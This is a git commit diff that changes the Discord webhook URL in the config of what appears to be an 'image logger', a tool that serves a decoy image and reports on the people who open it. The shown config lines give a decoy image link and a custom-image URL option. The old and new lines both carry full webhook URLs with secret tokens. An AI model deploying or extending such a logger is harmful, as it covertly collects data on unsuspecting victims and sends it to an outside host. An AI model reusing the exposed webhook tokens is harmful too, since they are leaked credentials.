fffef5c581625b6f3682e793c32609f43d9d46f3
hypix22 <lillebror22@icloud.com>
2025-11-17 11:21:20 +0100

    Change Discord webhook URL in config
    Updated the Discord webhook URL in the configuration.

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1417513233044209694/O0Ox3D9Rkqiw_ohKG9TLRqRKpCokVlI5m2Xnto1E_LF4xkRQvcuMapnqwKav6fCHG-BJ",
+    "webhook": "https://discord.com/api/webhooks/1439923061104312412/wL3vS4p44Pr6v7khv4XZeqMKp2g4rWL4BBtpJcKMIhWPycqUduAuSB5X3Cu4qTOeD5F5",
     "image": "https://www.shutterstock.com/image-photo/bill-torn-revealing-words-you-260nw-1734671219.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
